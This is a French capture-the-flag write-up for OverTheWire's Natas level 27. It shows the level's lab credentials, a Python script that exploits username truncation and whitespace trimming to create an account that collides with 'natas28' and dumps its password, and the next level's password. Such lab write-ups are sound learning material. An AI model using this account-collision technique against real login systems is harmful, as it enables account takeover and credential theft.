## Connexion (username=natas27 password=mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV)
```
http://natas27.natas.labs.overthewire.org/
```

## Recherche du mot de passe
```python
import requests

url = "http://natas27.natas.labs.overthewire.org/index.php"
header = {
    "Authorization": "Basic bmF0YXMyNzptajJtQkVQV3ljWFRUZzVCWFlUN1VQWGdYSHg1aGp2Vg=="
}

with requests.Session() as session:
    session.headers.update(header)
    
    # Chaîne de 65 caractères : natas28 (7) + 57 espaces + 'x' (1) = 65
    # Passe le trim(), et PHP la coupe à 64 (gardant natas28 + 57 espaces)
    username_payload = "natas28" + " " * 57
    
    payload_creation = {
        "username": username_payload + "x",
        "password": "abc"
    }
    
    print("--- Étape 1 : Création du compte ---")
    response1 = session.post(url, data=payload_creation)
    print(response1.text)

    # Pour la connexion, on envoie le nom EXACT stocké en base (64 caractères, avec les espaces)
    # checkCredentials va valider le mot de passe "abc" sur NOTRE ligne.
    # Ensuite dumpData() va faire un trim() sur cette chaîne, chercher "natas28" et dumper natas28
    payload_login = {
        "username": username_payload,
        "password": "abc"
    }
    
    print("\n--- Étape 2 : Extraction du Flag ---")
    response2 = session.post(url, data=payload_login)
    print(response2.text)

```

## Prochain mot de passe
```
Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3
```